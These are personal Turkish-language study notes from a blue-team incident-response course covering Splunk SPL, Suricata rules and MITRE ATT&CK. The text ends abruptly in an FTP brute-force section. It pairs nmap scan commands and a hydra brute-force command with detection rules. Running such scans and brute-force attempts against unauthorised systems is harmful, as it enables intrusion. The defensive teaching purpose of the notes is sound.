<!-- markdownlint template -->
<!-- markdownlint-disable MD033 -->

# **Cyber Security Blue Team: Incident Responder Series - Part 1**

Bu doküman, Alican Kiraz tarafından hazırlanmış olan "Cyber Security Blue Team: Incident Responder Series - Part 1" adlı Udemy eğitimi sırasında tuttuğum notları içermektedir.

## **Table of Contents**

- [**Cyber Security Blue Team: Incident Responder Series - Part 1**](#cyber-security-blue-team-incident-responder-series---part-1)
  - [**Table of Contents**](#table-of-contents)
  - [**Splunk SPL Language and Rule Development - SPL**](#splunk-spl-language-and-rule-development---spl)
    - [**Splunk Search Language Example**](#splunk-search-language-example)
      - [**Search (Arama)**](#search-arama)
      - [**Fields (Alanlar)**](#fields-alanlar)
      - [**Table (Tablo)**](#table-tablo)
      - [**Rename (Yeniden Adlandır)**](#rename-yeniden-adlandır)
      - [**Sort (Sıralama)**](#sort-sıralama)
      - [**Dedup (Tekrarlananları Kaldır)**](#dedup-tekrarlananları-kaldır)
      - [**Stats (İstatistik)**](#stats-i̇statistik)
      - [**Eval (Değerlendirme)**](#eval-değerlendirme)
      - [**Where (Koşullu Filtreleme)**](#where-koşullu-filtreleme)
      - [**Head (İlk N Sonuç)**](#head-i̇lk-n-sonuç)
      - [**Tail (Son N Sonuç)**](#tail-son-n-sonuç)
      - [**Characters and Structures (Karakterler ve Yapılar)**](#characters-and-structures-karakterler-ve-yapılar)
      - [**1. Piping (Pipe Kullanımı):** `|`](#1-piping-pipe-kullanımı-)
      - [**2. Subsearch (Alt Arama):** `[...]`](#2-subsearch-alt-arama-)
      - [**3. Macros (Makrolar):** `[...makro_adı...]`](#3-macros-makrolar-makro_adı)
  - [**Suricata Rule Development**](#suricata-rule-development)
    - [1. **Kural Yapısı**](#1-kural-yapısı)
    - [2. **Header**](#2-header)
    - [3. **Options**](#3-options)
    - [4. **Suricata Kuralları ve Performans**](#4-suricata-kuralları-ve-performans)
    - [5. **Kural Tipleri**](#5-kural-tipleri)
    - [6. **Kuralda Kullanılabilen Değişkenler**](#6-kuralda-kullanılabilen-değişkenler)
    - [7. **Kural Yönetimi ve Güncellemeler**](#7-kural-yönetimi-ve-güncellemeler)
    - [8. **Kural Yazım Örnekleri**](#8-kural-yazım-örnekleri)
  - [**MITRE ATT\&CK Review**](#mitre-attck-review)
    - [**MITRE ATT\&CK Framework'ün Ana Bileşenleri**](#mitre-attck-frameworkün-ana-bileşenleri)
      - [**MITRE ATT\&CK Framework'ün Kullanım Alanları**](#mitre-attck-frameworkün-kullanım-alanları)
    - [**Reconnaissance**](#reconnaissance)
      - [**21 - FTP**](#21---ftp)
        - [**1. Brute Force Attack**](#1-brute-force-attack)
        - [**2. Anonymous FTP Access**](#2-anonymous-ftp-access)
        - [**3. PASV FTP Trafiği Tespiti**](#3-pasv-ftp-trafiği-tespiti)
      - [**22 - SSH**](#22---ssh)
        - [**1. Brute Force Attack (SSH)**](#1-brute-force-attack-ssh)
        - [**2. SSH User Enumeration**](#2-ssh-user-enumeration)
      - [**23 - Telnet**](#23---telnet)
        - [**1. Brute Force Attack (Telnet)**](#1-brute-force-attack-telnet)
        - [**2. Telnet Banner Grabbing**](#2-telnet-banner-grabbing)
        - [**3. Telnet Clear-text Credentials**](#3-telnet-clear-text-credentials)
      - [**25 - SMTP**](#25---smtp)
        - [**1. SMTP User Enumeration**](#1-smtp-user-enumeration)
        - [**2. SMTP Relay Abuse**](#2-smtp-relay-abuse)
        - [**2. SMTP Banner Grabbing**](#2-smtp-banner-grabbing)
      - [**53 - DNS**](#53---dns)
        - [**1. DNS Zone Transfer**](#1-dns-zone-transfer)
        - [**2. DNS Reconnaissance**](#2-dns-reconnaissance)
        - [**3. DNS Amplification Attack**](#3-dns-amplification-attack)
      - [**80 - HTTP**](#80---http)
        - [**1. Directory Enumeration**](#1-directory-enumeration)
        - [**2. SQL Injection**](#2-sql-injection)
        - [**3. HTTP Flood (DDoS)**](#3-http-flood-ddos)
        - [**4. Directory Traversal**](#4-directory-traversal)
        - [**5. Command Injection**](#5-command-injection)
        - [**6. HTTP Request Smuggling**](#6-http-request-smuggling)
        - [**7. Header Injection**](#7-header-injection)
      - [**135 - RPC**](#135---rpc)
        - [**RPC Dump ve MS03-026 DCOM Exploit**](#rpc-dump-ve-ms03-026-dcom-exploit)
          - [**1. RPC Dump**](#1-rpc-dump)
          - [**2. MS03-026 DCOM Exploit**](#2-ms03-026-dcom-exploit)
      - [**139 - NetBIOS**](#139---netbios)
        - [**1. NetBIOS İsim Listeleme**](#1-netbios-i̇sim-listeleme)
        - [**2.NetBIOS DoS (Hizmet Reddi) Saldırısı**](#2netbios-dos-hizmet-reddi-saldırısı)
      - [**445 - SMB**](#445---smb)
        - [**SMB Versiyon Kontrolü**](#smb-versiyon-kontrolü)
    - [**Resource Development**](#resource-development)
      - [**Acqurie Infrastructure**](#acqurie-infrastructure)
      - [**Links to New Domains**](#links-to-new-domains)
      - [**Connections to Suspicious SSH Server**](#connections-to-suspicious-ssh-server)
      - [**Links to New or Suspiciouse Cloud Infrastructures**](#links-to-new-or-suspiciouse-cloud-infrastructures)
    - [**Initial Access**](#initial-access)
      - [**Drive-by Compromise**](#drive-by-compromise)
      - [**Exploit Public Facing Application**](#exploit-public-facing-application)
        - [1. **SQL Injection**](#1-sql-injection)
        - [2. **Remote File Inclusion (RFI)**](#2-remote-file-inclusion-rfi)
      - [**External Remote Services**](#external-remote-services)
        - [**RDP Brute Force**](#rdp-brute-force)
        - [**SSH Brute Force**](#ssh-brute-force)
    - [**Execution**](#execution)
      - [**Command and Scripting Interpreter**](#command-and-scripting-interpreter)
      - [**Windows Management Instrumentation**](#windows-management-instrumentation)
      - [**Scheduled Task**](#scheduled-task)
      - [**Service Execution**](#service-execution)
      - [**Third-party Software**](#third-party-software)
      - [**User Execution**](#user-execution)
      - [**Exploitation for Client Execution**](#exploitation-for-client-execution)
    - [**Persistence**](#persistence)
      - [**Account Manipulation**](#account-manipulation)
      - [**Boot or Logon Autostart Execution**](#boot-or-logon-autostart-execution)
      - [**Create or Modify System Process**](#create-or-modify-system-process)
      - [**Event Triggered Execution**](#event-triggered-execution)
      - [**External Remote Services (Persistence)**](#external-remote-services-persistence)
      - [**Scheduled Task/Job**](#scheduled-taskjob)
    - [**Privilege Escalation**](#privilege-escalation)
      - [**Horizontal Privilege Escalation**](#horizontal-privilege-escalation)
      - [**Vertical Privilege Escalation**](#vertical-privilege-escalation)
        - [**Windows UAC Bypass**](#windows-uac-bypass)
    - [**Defense Evasion**](#defense-evasion)
      - [**Obfuscated Files or Information**](#obfuscated-files-or-information)
      - [**Modify Registry**](#modify-registry)
      - [**Bypass User Account Control**](#bypass-user-account-control)
    - [**Credential Access**](#credential-access)
      - [**Credential Dumping**](#credential-dumping)
      - [**Man-in-the-Middle (MitM)**](#man-in-the-middle-mitm)
      - [**Password Filter DLL**](#password-filter-dll)
      - [**Securityd Memory**](#securityd-memory)
    - [**Discovery**](#discovery)
      - [**Account Discovery**](#account-discovery)
      - [**File and Directory Discovery**](#file-and-directory-discovery)
      - [**Process Discovery**](#process-discovery)
    - [**Lateral Movement**](#lateral-movement)
      - [**Pass the Hash**](#pass-the-hash)
      - [**SSH Hijacking**](#ssh-hijacking)
    - [**Collection**](#collection)
    - [**Exfiltration**](#exfiltration)
      - [**Automated Exfiltration**](#automated-exfiltration)
      - [**Data Compressed**](#data-compressed)
      - [**Data Encrypted**](#data-encrypted)
      - [**Exfiltration Over C2 Channel**](#exfiltration-over-c2-channel)
    - [**Command and Control**](#command-and-control)
      - [**Connection Proxy**](#connection-proxy)
      - [**Data Encoding**](#data-encoding)
      - [**Fallback Channels**](#fallback-channels)
      - [**Multi-hop Proxy**](#multi-hop-proxy)
    - [**Impact**](#impact)
      - [**Data Destruction**](#data-destruction)
      - [**Data Encrypted for Impact**](#data-encrypted-for-impact)
  - [**SYSMON Features**](#sysmon-features)
    - [**Rule Writing Example**](#rule-writing-example)
    - [**Örnek 1: Sysmon Kuralı (Chrome.exe Ağ Bağlantılarını İzlemek)**](#örnek-1-sysmon-kuralı-chromeexe-ağ-bağlantılarını-i̇zlemek)
    - [**Örnek 2: Belirli Bir IP'ye Yapılan Tüm Ağ Bağlantılarını Hariç Tutma**](#örnek-2-belirli-bir-ipye-yapılan-tüm-ağ-bağlantılarını-hariç-tutma)
    - [**Örnek 3: Belirli Bir Dosya Uzantasının Oluşumunu İzlemek**](#örnek-3-belirli-bir-dosya-uzantasının-oluşumunu-i̇zlemek)
  - [**IR : Containment, Eradication \& Remediation and Lessons Learned**](#ir--containment-eradication--remediation-and-lessons-learned)
    - [**Containment**](#containment)
      - [**Suspension of Accounts (Hesapların Askıya Alınması)**](#suspension-of-accounts-hesapların-askıya-alınması)
      - [**Defense (Savunma)**](#defense-savunma)
      - [**Isolation (İzolasyon)**](#isolation-i̇zolasyon)
      - [**Isolation (Savunma - İzolasyon)**](#isolation-savunma---i̇zolasyon)
      - [**RAM Analyses (Savunma - RAM Analizi)**](#ram-analyses-savunma---ram-analizi)
        - [**Windows Environment (Windows Ortamı)**](#windows-environment-windows-ortamı)
        - [**Linux Environment (Linux Ortamı)**](#linux-environment-linux-ortamı)
    - [**Eradication (Kök Sebep Temizliği)**](#eradication-kök-sebep-temizliği)
      - [**1. Detection of Malware (Kötü Amaçlı Yazılım Tespiti)**](#1-detection-of-malware-kötü-amaçlı-yazılım-tespiti)
      - [**2. Malware Removal (Kötü Amaçlı Yazılımın Kaldırılması)**](#2-malware-removal-kötü-amaçlı-yazılımın-kaldırılması)
      - [**3. Increasing System Security (Sistem Güvenliğini Artırma)**](#3-increasing-system-security-sistem-güvenliğini-artırma)
      - [**4. Applying Hotfix Patches (Sıcak Yama Uygulama)**](#4-applying-hotfix-patches-sıcak-yama-uygulama)
    - [**Remediation (İyileştirme)**](#remediation-i̇yileştirme)
      - [**1. Root Cause Analysis (Kök Neden Analizi)**](#1-root-cause-analysis-kök-neden-analizi)
      - [**2. Strengthening Systems and Applications (Sistem ve Uygulamaların Güçlendirilmesi)**](#2-strengthening-systems-and-applications-sistem-ve-uygulamaların-güçlendirilmesi)
      - [**3. Review of Security Policies and Procedures (Güvenlik Politikaları ve Prosedürlerinin Gözden Geçirilmesi)**](#3-review-of-security-policies-and-procedures-güvenlik-politikaları-ve-prosedürlerinin-gözden-geçirilmesi)
    - [**Lessons Learned (Alınan Dersler)**](#lessons-learned-alınan-dersler)
      - [**1. Post Incident Investigation (Olay Sonrası Soruşturma)**](#1-post-incident-investigation-olay-sonrası-soruşturma)
      - [**2. Documentation (Dokümantasyon)**](#2-documentation-dokümantasyon)
      - [**3. Implementation of Suggested Improvements (Önerilen İyileştirmelerin Uygulanması)**](#3-implementation-of-suggested-improvements-önerilen-i̇yileştirmelerin-uygulanması)

## **Splunk SPL Language and Rule Development - SPL**

Splunk Processing Language - SPL

Main Component Commands;

- search
- fields
- table
- rename
- sort
- dedup
- stats
- eval
- where
- head

### **Splunk Search Language Example**

!["Splunk Search Language Example"](/assets/splunk_search_language_example.png)

#### **Search (Arama)**

Bir sorguyla eşleşen olayları bulur.

- `search error`

#### **Fields (Alanlar)**

Belirli alanları ekler veya kaldırır.

- `fields + user_id, action`

#### **Table (Tablo)**

Sonuçları sütun formatında gösterir.

- `table user_id, action`

#### **Rename (Yeniden Adlandır)**

Alan adlarını yeniden adlandırır.

- `rename user_id as UserID`
- `...| rename old_field_name AS new_field_name`
- `...| rename userID AS User_ID`
- `...| rename old-field1 AS new-field1, old-field2 AS new-field2`
- `...| rename firstName AS first-name, lastName AS last_name`
- `...| eval new_field_name = old_field_name | rename new_field_name AS desired_field_name`

#### **Sort (Sıralama)**

Sonuçları bir veya daha fazla alana göre sıralar.

- Artan sıralama:
  - `| sort field_name`
    - `| sort price`
- Azalan sıralama:
  - `| sort -field_name`
    - `| sort -price`
- Çok alanlı sıralama:
  - `| sort -field1, field2`
    - `| sort category, -price`
- Sıralanan sonuç sayısını sınırlama:
  - `| sort limit=10 -field_name`
    - `| sort limit=5 -price`

#### **Dedup (Tekrarlananları Kaldır)**

Veri kümesini sadeleştirmek için tekrarlayan olayları kaldırır (uniq gibi düşünebilirsiniz).

- İlk olayları korur:
  - `| dedup field_Name`
    - `| dedup userID`
- Birden fazla alana göre tekrarlananları kaldırma:
  - `| dedup field1, field2`
    - `| dedup userID, action`
- Sıralamaya göre tekrarlananları kaldırma:
  - `| dedup field_name sortby=-another_field`
    - `| dedup userID sortby=-score` (en yüksek score değerini korur).

#### **Stats (İstatistik)**

Veri üzerinde istatistiksel hesaplamalar yapar.

- Alanlara göre olay sayımı:
  - `| stats count by field_name`
    - `| stats count by action`
- Bir alanın toplamını başka bir alana göre gruplandırma:
  - `| stats sum(field_name) by another_field`
    - `| stats sum(purchaseAmount) by userID`
- Birden fazla hesaplama yaparak gruplama:
  - `| stats count, avg(field_name), max(another_field) by yet_another_field`
    - `| stats count, avg(price), max(price) by product`
- Birden fazla alana göre gruplama:
  - `| stats count by field1, field2`
    - `| stats count by product, region`

#### **Eval (Değerlendirme)**

Hesaplamalar yapar, yeni alanlar oluşturur veya mevcut alanları değiştirir.

1. İki alanı toplama:
   - `| eval new_field = field1 + field2`
     - `| eval total_price = price + tax`
2. İndirim uygulama:
   - `| eval discount_price = price * 0.9`
3. Koşullu alan değerleri:
   - `| eval status = if(score > 90, "Excellent", "Good")`
4. Alanları birleştirme:
   - `| eval full_name = first_name . " " . last_name`
5. Değer yuvarlama:
   - `| eval rounded_price = round(price)`
6. Alanı değiştirme:
   - `| eval price = price * 0.8`
7. Null değerleri değiştirme:
   - `| eval field_name = coalesce(field_name, "default_value")`
8. Zaman damgalarını biçimlendirme:
   - `| eval readable_date = strftime(_time, "%y-%m-%d")`

#### **Where (Koşullu Filtreleme)**

Belirli koşullara göre sonuçları filtreler.

1. Büyükten küçüğe:
   - `| where field_name > value`
     - `| where price > 100`
2. Koşulları AND ile birleştirme:
   - `| where field1 = value1 AND field2 = value2`
     - `| where status = "active" AND age > 30`
3. Koşulları OR ile birleştirme:
   - `| where field1 = value1 OR field2 = value2`
     - `| where category = "electronics" OR category = "books"`
4. Null değer kontrolü:
   - `| where isnull(field_name)`
     - `| where isnull(email)`
   - `| where isnotnull(field_name)`
     - `| where isnotnull(email)`
5. İfadeleri değerlendirme:
   - `| where (price * 0.9) > 50`

#### **Head (İlk N Sonuç)**

İlk N sonucu gösterir.

1. İlk 10 sonuç:
   - `| head 10`
2. Varsayılan (ilk 10 sonuç):
   - `| head`
3. Sıralamadan sonra:
   - `| sort -_time | head 5`
4. Filtrelenmiş ve sınırlanmış:
   - `| search category = "electronics" | head 3`

#### **Tail (Son N Sonuç)**

Son N sonucu gösterir.

1. Son 10 sonuç:
   - `| tail 10`
2. Varsayılan (son 10 sonuç):
   - `| tail`
3. Sıralamadan sonra:
   - `| sort _time | tail 5`
4. Filtrelenmiş ve sınırlanmış:
   - `| search category = "electronics" | tail 3`

#### **Characters and Structures (Karakterler ve Yapılar)**

#### **1. Piping (Pipe Kullanımı):** `|`

1. `index=weblogs status=200 | sort -_time | head 10`  
   - En yeni olayları gösterir (en yeniden en eskiye doğru sıralama).

2. `index=sales | search category="electronics" | stats sum(sales) as total_sales by product | sort -total_sales | head 5`
   - Elektronik kategorisindeki en çok satış yapılan 5 ürünü getirir.

3. `index=weblogs | eval response_time_ms = response_time * 1000 | top response_time_ms`
   - Yanıt sürelerini milisaniyeye çevirir ve en sık görülen yanıt sürelerini listeler.

4. `index=weblogs | where response_time > 2 | stats count by status_code`
   - Yanıt süresi 2 saniyeden büyük olan olayları durum kodlarına göre sayar.

5. `index=weblogs earliest="2023-08-01 00:00:00" latest="2023-08-02 00:00:00" | stats count by user_agent`
   - Belirli bir zaman aralığındaki user_agent değerlerini sayar.

#### **2. Subsearch (Alt Arama):** `[...]`

Subsearch ana arama yapılmasından önce çalıştırılır (10.000 sonuç ile sınırlıdır).

1. `index=weblogs [ search index=threats threat_type="malicious" | fields src_ip ]`
   - Zararlı IP adreslerini içeren weblog olaylarını arar.

2. `index=weblogs [ search index=weblogs | top limit=10 user | fields user ]`
   - En aktif 10 kullanıcıyı içeren weblog olaylarını getirir.

3. `index=weblogs [ search index=weblogs earliest=-1h@h latest=now status=500 | fields request-id ]`
   - Son bir saat içinde 500 durum koduyla sonuçlanan olayları getirir.

#### **3. Macros (Makrolar):** `[...makro_adı...]`

1. **Makro Tanımlama:**

   - Splunk Web arayüzünde yeni bir makro tanımlamak için:  
     `Ayarlar (Settings) > Gelişmiş Arama (Advanced Search) > Arama Makroları (Search Macros)` yolunu izleyebilirsiniz.

2. **Makro Tanımı Örneği:**

   - **Makro Adı:**`my_example_macro`
   - **Tanım:** `index=weblogs sourcetype=access_logs`
   - **Argümanlar:** Yok (`[]`)

3. **Makro Kullanımı:**

   - `my_example_macro | stats count by status`
   - Makroyu çağırır ve sonuçları durum kodlarına göre gruplar.

## **Suricata Rule Development**

Suricata, ağ trafiğini izlemek ve güvenlik tehditlerini tespit etmek için kullanılan bir açık kaynaklı ağ güvenlik izleme sistemidir. Suricata'nın kural mekanizması, belirli ağ faaliyetlerini izleyip bunlara tepki verirken kullanılan kuralları ve yapılandırmaları içerir. Bu kurallar, ağ trafiğini analiz etmek, saldırıları tespit etmek ve bunlara karşı önlemler almak için kullanılır.

Suricata kuralları, temelde Snort kurallarıyla uyumlu olup, aşağıdaki ana bileşenlerden oluşur:

### 1. **Kural Yapısı**

Suricata kuralları, belirli bir formatta yazılır ve her biri aşağıdaki ana bileşenlerden oluşur:

- **Header:** Kuralın genel özelliklerini tanımlar. Bu, kuralın türünü, protokolünü, portlarını ve diğer parametreleri içerir.
- **Options:** Kuralın hangi koşullarda tetikleneceğini ve ne yapılacağını tanımlar. İçeriğinde ağ verisi, belirli paket içeriği ve benzeri parametreler bulunabilir.

### 2. **Header**

Header, kuralın başında yer alır ve temel parametreleri içerir:

- **Action:** Yapılacak işlem (örneğin, `alert` (uyarı), `drop` (düşürme), `pass` (geçiş)).
- **Protocol:** İlgili protokol (TCP, UDP, ICMP vb.).
- **Source IP/Port:** Kaynak IP ve port numarası.
- **Destination IP/Port:** Hedef IP ve port numarası.
- **Direction:** Trafiğin yönü (`->` kaynaktan hedefe, `<->` her iki yönde).
  
```xml
<action><proto><src_ip><src_port> -> <dest_ip><dest_port> [<options>]
```

Örnek:

```plaintext
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"HTTP GET Request"; content:"GET"; http_method; sid:1000001;)
```

Bu örnekte, TCP protokolü üzerinden, kaynak IP’si `$HOME_NET` ve hedef portu `$HTTP_PORTS` olan HTTP GET isteklerini izler.

### 3. **Options**

Options bölümü, bir kuralın tetiklenme koşullarını tanımlar. Yaygın kullanılan opsiyonlar şunlardır:

- **content:** Paket içinde aranan belirli bir içerik.
- **pcre:** Düzenli ifadeyle arama.
- **flow:** Trafiğin yönü ve türü (örneğin, `to_server`, `from_client` gibi).
- **flags:** TCP bayrakları, örneğin SYN, ACK gibi.
- **http_method:** HTTP isteklerinde kullanılan metodun (GET, POST vb.) analizi.
- **threshold:** Belirli bir sayıda olayı sınırlama.
  
Örnek:

```plaintext
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"HTTP GET Request"; content:"GET"; http_method; sid:1000001;)
```

Bu kurallar, sadece HTTP GET metoduyla yapılan istekleri izler.

### 4. **Suricata Kuralları ve Performans**

Suricata, yüksek trafik hacimlerinde dahi etkin bir şekilde çalışacak şekilde optimize edilmiştir. Yüksek performans için donanım hızlandırma (DPDK) ve çoklu işlem kullanımı gibi teknolojileri de destekler.

### 5. **Kural Tipleri**

Suricata, farklı türlerde kuralları destekler:

- **Alert:** Belirtilen koşul gerçekleştiğinde bir uyarı oluşturur.
- **Drop:** Trafiği durdurur.
- **Reject:** Trafiği reddeder ve hedefe yanıt verir.
- **Pass:** Trafiğin kural tarafından kontrol edilmeden geçmesine izin verir.
- **Activate / Deactivate:** Zamanlı kurallar için kullanılır.

### 6. **Kuralda Kullanılabilen Değişkenler**

Suricata, kural yazarken kullanabileceğiniz birçok yerel değişkeni destekler:

- `$HOME_NET`: Yerel ağ (Home Network) IP aralığı.
- `$EXTERNAL_NET`: Harici ağ (External Network) IP aralığı.
- `$HTTP_PORTS`: HTTP servislerinin çalıştığı portlar (genellikle 80, 443 vb.).
- `$SMTP_PORTS`: SMTP servislerinin çalıştığı portlar (genellikle 25 vb.).

### 7. **Kural Yönetimi ve Güncellemeler**

Suricata kuralları, sürekli olarak güncellenir. Bu güncellemeler genellikle:

- **Emerging Threats:** Ücretsiz ve ticari olarak kullanılan Suricata ve Snort kuralları sağlayıcısıdır.
- **ET Open:** Açık kaynaklı, ücretsiz kural setidir.
- **Suricata-Update:** Suricata'nın kural setlerini güncelleyen bir araçtır.

### 8. **Kural Yazım Örnekleri**

Bir web uygulaması saldırısını tespit etmek için yazılmış örnek bir kural:

```plaintext
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Possible SQL Injection"; flow:to_server,established; content:"union select"; nocase; http_uri; sid:1000002;)
```

Bu kural, dış ağdan gelen, HTTP üzerinden "union select" içeren bir istek tespit ettiğinde, olası SQL enjeksiyon saldırısı olarak işaret eder.

## **MITRE ATT&CK Review**

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) Framework, siber güvenlikte saldırı tekniklerini ve taktiklerini anlamak ve sınıflandırmak için kullanılan kapsamlı bir bilgi tabanıdır. MITRE Corporation tarafından geliştirilen bu framework, siber saldırıların yaşam döngüsünü anlamayı ve savunma stratejilerini optimize etmeyi amaçlar.

Taktikler dikeyde, teknikler ise yatayda sıralanır.

### **MITRE ATT&CK Framework'ün Ana Bileşenleri**

1. **Taktikler (Tactics):** Saldırganın belirli bir hedefe ulaşmak için gerçekleştirdiği genel amaçlardır. Örneğin, "Initial Access" (Başlangıç Erişimi) bir taktik olabilir.

    - **Initial Access:** Saldırganın hedef sisteme ilk kez erişim sağlaması.
    - **Execution:** Saldırganın kötü amaçlı yazılımı çalıştırmak veya komutları yürütmek için kullandığı teknikler.
    - **Persistence:** Saldırganın, hedef sisteme kalıcı erişim sağlamak için kullandığı yöntemler.
    - **Privilege Escalation:** Saldırganın, daha yüksek yetkiler elde etmek amacıyla sistemdeki açıkları kullanması.
    - **Defense Evasion:** Saldırganın, güvenlik önlemleri ve savunmalarından kaçmak için kullandığı teknikler.
    - **Credential Access:** Saldırganın, hedef sisteme giriş yapmak için gerekli kimlik bilgilerini çalma veya ele geçirme yöntemleri.
    - **Discovery:** Saldırganın, hedef sisteme dair bilgi toplamak için kullandığı teknikler.
    - **Lateral Movement:** Saldırganın, ağda veya sistemde ilerlemek için kullandığı yöntemler.
    - **Collection:** Saldırganın, hedef sistemdeki bilgi veya verileri toplaması.
    - **Exfiltration:** Saldırganın, hedef sistemden verileri dışarıya çıkarması.
    - **Impact:** Saldırganın, hedef sistemdeki veriyi silme, bozulma veya zarar verme amaçlı gerçekleştirdiği eylemler.
    - **Reconnaissance:** Hedefe yönelik saldırıdan önce bilgi toplama ve keşif yapma süreci.

2. **Teknikler (Techniques):** Taktiklerin uygulanma yollarıdır. Her teknik, belirli bir taktiği gerçekleştirmek için kullanılabilir. Örneğin, "Phishing" (Oltalama) tekniği, "Initial Access" taktiğinin bir parçasıdır.

3. **Alt Teknikler (Sub-Techniques):** Tekniklerin daha detaylı seviyelerde incelenmiş halleri. Örneğin, "Phishing" tekniğinin altında "Spear Phishing Attachment" gibi alt teknikler bulunabilir.

4. **Prosedürler (Procedures):** Saldırganların belirli teknikleri nasıl kullandığını tanımlar. Bu, bir saldırganın belirli bir saldırı türünü uygularken takip ettiği adımlardır.

5. **Mitigations (Önlemler):** Belirli tekniklere karşı alınabilecek savunma önlemleridir. Örneğin, "Multi-Factor Authentication" (Çok Faktörlü Kimlik Doğrulama) gibi önlemler.

6. **Indicators (Göstergeler):** Saldırıların izlenmesi ve tespiti için kullanılabilecek izler ve göstergelerdir. Bu, bir saldırının başarılı olup olmadığını anlamak için kullanılabilecek veriler olabilir.

#### **MITRE ATT&CK Framework'ün Kullanım Alanları**

- **Saldırı Simülasyonları ve Testleri:** Organizasyonlar, güvenlik sistemlerini ve süreçlerini test etmek için framework'ü kullanabilirler.
- **Tehdit İstihbaratı:** Framework, tehdit istihbaratı raporlarının analizi ve korelasyonu için bir referans sağlar.
- **Savunma Stratejileri:** Savunma stratejileri geliştirmek ve iyileştirmek için kullanılır.
- **Güvenlik Farkındalığı ve Eğitim:** Güvenlik ekiplerinin eğitiminde ve farkındalık artırmada kullanılır.

MITRE ATT&CK Framework, sürekli olarak güncellenmekte ve genişletilmektedir, bu da onu siber güvenlik dünyasında kritik bir kaynak haline getirir. Siber güvenlik uzmanları, bu framework'ü kullanarak daha iyi savunma stratejileri geliştirebilir ve potansiyel saldırıları daha etkili bir şekilde tespit edebilirler.

### **Reconnaissance**

Saldırı öncesinde hedefe yönelik bilgi toplama sürecidir. Kötü niyetli aktörlerin, hedef sistem hakkında olabildiğince fazla bilgi toplayarak saldırı stratejilerini buna göre planladıkları aşamadır. Bu aşama, bir saldırının en erken safhasıdır.

- **Active Scanning (Aktif Tarama):** Hedef sisteme yönelik aktif yöntemlerle yapılan tarama ve keşif işlemi.
- **Gather Victim Network Information (Hedefin Ağ Bilgilerini Toplama):** Hedefin ağ yapısı ve kullanılan protokoller hakkında bilgi toplama.
- **Gather Victim Identity Information (Hedef Kimlik Bilgilerini Toplama):** Hedef kişi veya organizasyon hakkında kişisel ve tanımlayıcı bilgiler toplama.
- **Search Open Technical Databases (Açık Teknik Veritabanlarını Araştırma):** Hedefle ilgili açık veritabanlarından teknik bilgi arama.
- **Search Open Websites/Domains (Açık Web Sitelerini/Domenleri Araştırma):** Hedefin sahip olduğu açık web siteleri ve domainler üzerinde araştırma yapma.
- **Search Victim-Owned Websites (Hedefin Sahip Olduğu Web Sitelerini Araştırma):** Hedefin sahip olduğu özel web sitelerinde açık bilgileri arama.
- **Map Network Topology (Ağ Topolojisini Haritalama):** Hedef ağının yapısını ve cihazlarını analiz etme.

**Port Scan Types and Nmap Commands:**

1. **TCP Connect Scan**

   - Nmap: `nmap -sT 192.168.1.1`  
   Açıklama: Tam bağlantı kurarak yapılan taramadır. Port açık olduğunda bağlantı tamamlanır.

2. **SYN Scan**

   - Nmap: `nmap -sS 192.168.1.1`  
   Açıklama: Yarı açık tarama. SYN paketleri gönderilir, yanıt alınırsa port açıktır.

3. **UDP Scan**

   - Nmap: `nmap -sU 192.168.1.1`  
   Açıklama: UDP portlarını tarar. Yanıt yoksa port açık olabilir.

4. **FIN, NULL, Xmas Scan**

   - **FIN Scan:** `nmap -sF 192.168.1.1`  
     Açıklama: Kapalı portlar RST yanıtı verir, açık portlar yanıt vermez.
   - **NULL Scan:** `nmap -sN 192.168.1.1`  
     Açıklama: Hiçbir bayrak göndermez, kapalı portlar RST yanıtı verir.
   - **Xmas Scan:** `nmap -sX 192.168.1.1`  
     Açıklama: FIN, URG ve PSH bayrakları gönderir. Açık portlar yanıt vermez.

5. **ACK Scan**

   - Nmap: `nmap -sA 192.168.1.1`  
   Açıklama: Firewall veya filtreleme cihazlarını test eder, kapalı portlar RST yanıtı verir.

**Splunk Detection Rules:**

1. **TCP Connect Tarama Tespiti**

   ```spl
   index=network_Jogs sourcetype=tcp_Jogs flags="SYN.ACK" 
   | stats count by src_ip, dest_ip, dest_port 
   | where count > 100
   ```

2. **SYN Tarama Tespiti**

   ```spl
   index=network_Jogs sourcetype=tcp_Jogs flags="SYN" 
   | stats count by src_ip, dest_ip, dest_port 
   | where count > 100
   ```

3. **UDP Tarama Tespiti**

   ```spl
   index=network_Jogs sourcetype=udp_Jogs 
   | stats count by src_ip, dest_ip, dest_port 
   | where count > 100
   ```

4. **FIN, NULL, Xmas Tarama Tespiti**

   ```spl
   index=network_Jogs sourcetype=tcp_Jogs 
   (flags="FIN" OR flags="NULL" OR flags="FIN.URG.PSH") 
   | stats count by src_ip, dest_ip, dest_port 
   | where count > 10
   ```

5. **ACK Tarama Tespiti**

   ```spl
   index=network_Jogs sourcetype=tcp_Jogs flags="ACK" 
   | stats count by src_ip, dest_ip, dest_port 
   | where count > 10
   ```

**Suricata Detection Rules:**

1. **TCP Connect Tarama**

   ```suricata
   alert tcp any any -> 192.168.1.0/24 any (msg:"TCP Connect Scan Detected"; flags:S,12; sid:1000001;)
   ```

2. **SYN Tarama (Yar Açık Tarama)**

   ```suricata
   alert tcp any any -> 192.168.1.0/24 any (msg:"SYN Scan Detected"; flags:S; sid:1000002;)
   ```

3. **UDP Tarama**

   ```suricata
   alert udp any any -> 192.168.1.0/24 any (msg:"UDP Scan Detected"; sid:1000003;)
   ```

4. **FIN, NULL, Xmas Tarama**

   - **FIN Tarama**

     ```suricata
     alert tcp any any -> 192.168.1.0/24 any (msg:"FIN Scan Detected"; flags:F; sid:1000004;)
     ```

   - **NULL Tarama**

     ```suricata
     alert tcp any any -> 192.168.1.0/24 any (msg:"NULL Scan Detected"; flags:0; sid:1000005;)
     ```

   - **Xmas Tarama**

     ```suricata
     alert tcp any any -> 192.168.1.0/24 any (msg:"Xmas Scan Detected"; flags:FPU; sid:1000006;)
     ```

#### **21 - FTP**

- FTP protokolü, verilerin düz metin olarak iletildiği bir protokoldür ve bu nedenle yetkisiz erişim ve brute force gibi saldırılara maruz kalabilir.

##### **1. Brute Force Attack**

*Not: Brute force saldırıları, doğru kimlik bilgilerini tahmin etmek için otomatik araçlarla çok sayıda kullanıcı adı ve şifre kombinasyonu denemeyi içerir.*  

- **Attack Command**

```bash
hydra -l [username] -P [password-list.txt] ftp://[target-IP]
```

- **Suricata Rule**

